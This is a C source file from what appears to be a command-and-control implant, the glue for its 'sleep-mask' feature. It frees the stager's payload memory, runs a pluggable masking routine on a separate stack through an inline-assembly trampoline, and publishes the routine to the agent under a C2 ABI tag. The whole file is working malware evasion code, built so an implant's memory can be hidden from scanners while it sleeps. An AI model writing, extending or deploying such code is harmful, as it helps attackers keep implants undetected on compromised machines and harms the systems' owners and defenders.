/* mask.c — the sleep-mask provider contract glue.
 *
 * A provider is selected at build time with MASK=<name> and implements
 * stager_mask_provider_sleep() in mask_<name>.c. The stub publishes the
 * wrapper below in the same-process GS state block the agent reads; adding a
 * provider requires no change to the stub or agent.
 */

#include "mask.h"

#include "state.h"
#include "util/utils.h"

/*
 * Switch to the stager's dedicated stack while the provider runs. The agent's
 * stack is part of the masked set, so the trampoline's own frame must live on
 * the stub stack. Only %rbp needs saving: entry rsp is 8 mod 16, one push
 * restores the 16-byte alignment required before `call`.
 */
__attribute__((naked, used, visibility("default"))) int
stager_mask_run_on_stack(unsigned seconds, uintptr_t probe, void *stack_top,
                         uintptr_t keep_start, uintptr_t keep_end) {
  __asm__ __volatile__("pushq %rbp\n"
                       "movq %rsp, %rbp\n"
                       "movq %rdx, %rax\n" /* stack_top */
                       "movq %rcx, %rdx\n" /* keep_start -> arg 3 */
                       "movq %r8, %rcx\n"  /* keep_end -> arg 4 */
                       "movq %rax, %rsp\n"
                       "call stager_mask_provider_sleep\n"
                       "movq %rbp, %rsp\n"
                       "popq %rbp\n"
                       "ret\n");
}

int stager_mask_sleep(unsigned seconds, uintptr_t probe) {
  struct stager_state *st = get_stager_state();
  if (st->payload != NULL && st->payload_size > 0) {
    munmap(st->payload, PAGE_ALIGN_UP(st->payload_size));
    st->payload = NULL;
    st->payload_size = 0;
  }
  if (st->mask_stack_top == NULL || st->state_map_len == 0)
    return -1;
  uintptr_t keep_start = (uintptr_t)st;
  uintptr_t keep_end = keep_start + st->state_map_len;
  return stager_mask_run_on_stack(seconds, probe, st->mask_stack_top,
                                  keep_start, keep_end);
}

void stager_mask_publish(void) {
  struct stager_state *st = get_stager_state();
  st->pub.abi_magic = C2_STAGER_ABI_MAGIC;
  st->pub.abi_version = C2_STAGER_ABI_VERSION;
  st->pub.mask_fn = stager_mask_sleep;
}
